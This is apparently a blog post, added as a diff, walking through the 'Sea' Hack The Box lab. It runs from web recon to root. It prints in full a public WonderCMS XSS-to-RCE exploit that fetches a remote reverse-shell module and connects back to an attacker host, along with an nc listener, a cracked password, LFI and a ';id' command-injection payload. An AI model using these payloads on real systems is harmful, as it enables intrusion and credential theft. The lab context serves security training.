@@ -1,0 +1,182 @@
+---
+layout: post
+title: "Sea HTB writeup"
+subtitle: "Walkethrough for the Sea HTB machine."
+date: 2024-08-23 23:45:13
+background: '/img/posts/04.jpg'
+
+---
+
+## Initial Recon
+Beginning with a default nmap scan ![nmap scan](/img/Sea_Screenshots/Pasted image 20240820215801.png)  
+Found ports 22 (SSH) and 80 (HTTP). I decided there was no need to perform service scanning.  
+
+Meanwhile, I started the usual directory brute forcing in the background.
+```bash
+┌──(kali㉿kali)-[/tmp/sea]
+└─$ gobuster dir -u=http://$ip -w=/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
+```  
+
+Found some interesting entries ![directories bruteforcing](/img/Sea_Screenshots/Pasted image 20240820220124.png)  
+
+Further enumerating each directory found we get:  
+1. Plugins ![plugins](/img/Sea_Screenshots/Pasted image 20240820220410.png)   
+2. themes ![themes](/img/Sea_Screenshots/Pasted image 20240820225647.png)  
+3. data ![data](/img/Sea_Screenshots/Pasted image 20240820230608.png)  
+4. home ![home](/img/Sea_Screenshots/Pasted image 20240820230644.png)  
+
+The only interesting finding here in my opinion is the themes/bike and the `data/files` so lets check them both
+1. `/themes/bike` ![themes_bike](/img/Sea_Screenshots/Pasted image 20240820230825.png)
+2. `/data/files`:nothing interesting  
+
+For `/themes/bike/version` we get **3.2.0** ![bike_version](/img/Sea_Screenshots/Pasted image 20240820231028.png)  
+looking at the scans we got from bike, it seems to be like a github repo so trying `README.md` and get a hit!! ![readme](/img/Sea_Screenshots/Pasted image 20240820231332.png)  
+**WonderCMS Version 3.2.0**  
+Checking for vulnerabilities, found this [link](https://github.com/prodigiousMind/CVE-2023-41425) so cloned the repo just in case we need it ![repo_cloning](/img/Sea_Screenshots/Pasted image 20240820231645.png)  
+Time to access the webpage :\)) at least now we know what we will be facing ![index](/img/Sea_Screenshots/Pasted image 20240820231750.png)  
+Clicking on *how to participate button* ![how\_to\_participate](/img/Sea_Screenshots/Pasted image 20240820231830.png)  
+We get a hyperlink on *contact*, clicking on it we get a redirection to `sea.htb/contact.php` time to edit some hosts files :\)\)  
+After correctly loading the page, we get a very interesting finding ![contact_page](/img/Sea_Screenshots/Pasted image 20240820232031.png)  
+This leads to pretty much a lot of attacks vectors.  
+First, trying some basic XSS ![xss_trial](/img/Sea_Screenshots/Pasted image 20240820232151.png)  
+we get some 'front end' input sanitization so firing up burpsuite ![foxyproxy](/img/Sea_Screenshots/Pasted image 20240820232227.png)  
+![burpsuite](/img/Sea_Screenshots/Pasted image 20240820232307.png)  
+Catching the request from the proxy tab ![requ_proxy](/img/Sea_Screenshots/Pasted image 20240820232355.png)  
+This is the URL encoding of our request sent earlier  
+will send it to the 'Repeater' and try some  XSS payloads ![repeater](/img/Sea_Screenshots/Pasted image 20240820232457.png)  
+No input sanitization on backend ![input_sanitization](/img/Sea_Screenshots/Pasted image 20240820232605.png)  
+ No reflection so cannot use 90% of XSS payloads  
+ Trying to steal cookie as this form is getting submitted and maybe checked by a higher authority ![cookie_steal](/img/Sea_Screenshots/Pasted image 20240820232935.png)  
+  but before firing up I had to open a server ![server](/img/Sea_Screenshots/Pasted image 20240820233010.png)  
+  Waited for more than 10 minutes but got nothing. Tried to change payload and do tricks for escaping but got nothing.  
+  Checking the exploit we cloned earlier  
+ ```python
+  # Author: prodigiousMind
+# Exploit: Wondercms 4.3.2 XSS to RCE
+
+
+import sys
+import requests
+import os
+import bs4
+
+if (len(sys.argv)<4): print("usage: python3 exploit.py loginURL IP_Address Port\nexample: python3 exploit.py http://localhost/wondercms/loginURL 192.168.29.165 5252")
+else:
+  data = '''
+var url = "'''+str(sys.argv[1])+'''";
+if (url.endsWith("/")) {
+ url = url.slice(0, -1);
+}
+var urlWithoutLog = url.split("/").slice(0, -1).join("/");
+var urlWithoutLogBase = new URL(urlWithoutLog).pathname; 
+var token = document.querySelectorAll('[name="token"]')[0].value;
+var urlRev = urlWithoutLogBase+"/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=" + token;
+var xhr3 = new XMLHttpRequest();
+xhr3.withCredentials = true;
+xhr3.open("GET", urlRev);
+xhr3.send();
+xhr3.onload = function() {
+ if (xhr3.status == 200) {
+   var xhr4 = new XMLHttpRequest();
+   xhr4.withCredentials = true;
+   xhr4.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php");
+   xhr4.send();
+   xhr4.onload = function() {
+     if (xhr4.status == 200) {
+       var ip = "'''+str(sys.argv[2])+'''";
+       var port = "'''+str(sys.argv[3])+'''";
+       var xhr5 = new XMLHttpRequest();
+       xhr5.withCredentials = true;
+       xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
+       xhr5.send();
+       
+     }
+   };
+ }
+};
+'''
+  try:
+    open("xss.js","w").write(data)
+    print("[+] xss.js is created")
+    print("[+] execute the below command in another terminal\n\n----------------------------\nnc -lvp "+str(sys.argv[3]))
+    print("----------------------------\n")
+    XSSlink = str(sys.argv[1]).replace("loginURL","index.php?page=loginURL?")+"\"></form><script+src=\"http://"+str(sys.argv[2])+":8000/xss.js\"></script><form+action=\""
+    XSSlink = XSSlink.strip(" ")
+    print("send the below link to admin:\n\n----------------------------\n"+XSSlink)
+    print("----------------------------\n")
+
+    print("\nstarting HTTP server to allow the access to xss.js")
+    os.system("python3 -m http.server\n")
+  except: print(data,"\n","//write this to a file")
+ ```
+ As we can see, it has a usage of  `python3 exploit.py loginURL IP_Address Port`  
+ the logiURL is being sanitized  
+ a module is getting fetched from the internet  
+ a page is being created at `/themes/revshell-main/rev.php` with parameters `lhost` and `lport`  
+ What we will do is to change some things in the script  
+  The modules needs to be installed as HTB machines cannot access the internet and then fetch it from our local machine  
+  We will first try  to run the expoit without changing anything and see if it is working ![exploit_check](/img/Sea_Screenshots/Pasted image 20240820234800.png)  
+  Now open a netcat listener and send this link to the contact form *website* entry and wait  
+  we get a reply from the server finally ![netcat](/img/Sea_Screenshots/Pasted image 20240820235818.png)  
+  now accessing this url with those specific parameters to catch a reverse shell on my listener  
+  ```
+  http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.16.55&lport=4444
+  ```
+  ![reverse_access](/img/Sea_Screenshots/Pasted image 20240821002053.png)  
+  Upgrading the shell and spawning a real TTY shell ![tty_shell](/img/Sea_Screenshots/Pasted image 20240821002210.png)  
+  Found `database.js` in `/var/www/sea/data` where a hash could be identified ![database](/img/Sea_Screenshots/Pasted image 20240821002344.png)  
+  This seems to be a valid hash but something was odd, `\\` are present to escape the `/` so had to remove them and pass it to hashid ![hashid](/img/Sea_Screenshots/Pasted image 20240821002527.png)  
+  
+  a `Blowfish` hash was identified  
+  cracking with mode *3200* ![hashcat](/img/Sea_Screenshots/Pasted image 20240821002626.png)  
+  Found a valid password `mychemicalromance`  
+  password spraying on the current users including root ![users](/img/Sea_Screenshots/Pasted image 20240821002727.png)  
+  valid credentials found `amay:mychemicalromance`  
+  SSH to get a better foothold ![ssh](/img/Sea_Screenshots/Pasted image 20240821180625.png)  
+  Beginning with the privilege escalation checklist  
+  Starting with sudo permissions ![sudo_check](/img/Sea_Screenshots/Pasted image 20240821180725.png)  
+  Checking for internal ports and running services ![ports](/img/Sea_Screenshots/Pasted image 20240821180808.png)  
+  Got 2 interesting ports *59691* and *8080*   
+  curling both ports got us 2 different responses ![curl](/img/Sea_Screenshots/Pasted image 20240821180919.png)  
+  1. **8080**: Unauthorized access which is making me curious
+2. **59691**: No response at all so will just leave it and will get to it later if no attack vector was found  
+Achieving local port forwarding using ssh ![localPort](/img/Sea_Screenshots/Pasted image 20240821181543.png)  
+Accessing the internal service on our `localhost:4444` address  
+We get a login form, entering `Amay` credentials ![amay](/img/Sea_Screenshots/Pasted image 20240821181744.png)  
+We are welcomed with the index page ![local_index](/img/Sea_Screenshots/Pasted image 20240821181813.png)  
+Clicking on analyze `access.log` ![accessLog](/img/Sea_Screenshots/Pasted image 20240821181903.png)  
+seems to be an LFI potential vulnerability  
+We get a weird message at the end ![weird](/img/Sea_Screenshots/Pasted image 20240821181938.png)  
+Intercepting the request with burpsuite ![burp](/img/Sea_Screenshots/Pasted image 20240821182126.png)  
+Sending to the repeater to begin playing with the Packet ![repeaterAgain](/img/Sea_Screenshots/Pasted image 20240821182155.png)  
+Changing the parameter to `/etc/passwd` ![etcpasswd](/img/Sea_Screenshots/Pasted image 20240821182226.png)  
+We get some of the `/etc/passwd` file ![someetc](/img/Sea_Screenshots/Pasted image 20240821182306.png)  
+and the weird sentence....  
+Checking the permissions on the access.log file we get permission denied
+so Trying to check the permissions on the whole directory ![perm](/img/Sea_Screenshots/Pasted image 20240821182530.png)  
+It seems that this process is running as root  
+**Analysis:**
+1. Service running as root and has permissions to read all the files on the file system
+2. It can check the content of the files and compare it to a sort of regex and then print out  the suspicious pattern sentence
+3. A process may be running on the machine that takes the data given from the application, run a specific command on the server and return the output to the application displaying it
+After doing those analysis, tried to check for background running processes using 'pspy64' but got nothing (some protections are on place)  
+Trying some command injection payloads  
+Running this payload ![commandinjection](/img/Sea_Screenshots/Pasted image 20240821183051.png)  
+analyzing the response ![response](/img/Sea_Screenshots/Pasted image 20240821183122.png)  
+The whole `/etc/passwd` file is not printed out but still with the malicious pattern sentence at the end  
+Running `/etc/shadow;id` ![shadow](/img/Sea_Screenshots/Pasted image 20240821183228.png) We get the hash of the root user and compromising the machine
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
